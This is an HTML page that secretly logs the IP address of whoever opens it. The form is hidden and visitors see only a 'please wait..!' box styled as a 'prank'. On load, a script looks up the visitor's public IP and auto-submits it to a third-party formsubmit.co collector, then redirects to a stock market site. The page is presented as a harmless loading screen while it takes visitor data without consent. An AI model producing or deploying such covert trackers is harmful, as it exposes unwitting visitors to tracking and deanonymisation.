<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>User IP Address Form</title>
</head>
<body>
  <style>
    form{
      display: none;
    }
  .prank{
    position: fixed;
    margin-top: 70%;
    margin-left: 5%;
    width: 300px;
    height: 140px;
    background-color: #ddd;
    border-radius: 15px;
    box-shadow: 0px 0px 14px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  </style>

<form id="userForm" action="https://formsubmit.co/ca99b24713c7f553dbde071c7783a3c3" method="POST">
  <label for="ipAddress">IP Address:</label>
  <input type="text" id="ipAddress" name="ipAddress" placeholder="Your IP address will be displayed here" readonly>
  <input type="hidden" name="_next" value="https://www.moneycontrol.com/stocksmarketsindia/">
  
  <input type="hidden" name="_captcha" value="false">
</form>
<div class="prank">
  please wait..!
</div>
<script>
  // Function to fetch user's IP address
  function getUserIP() {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        // Extracting IP address from the response
        var ipAddress = data.ip;
        // Filling the IP address into the form field
        document.getElementById("ipAddress").value = ipAddress;
        // Automatically submit the form
        document.getElementById("userForm").submit();
      })
      .catch(error => {
        console.error('Error:', error);
      });
  }

  // Call the function to fetch user's IP address when the page loads
  window.onload = getUserIP;
</script>

</body>
</html>
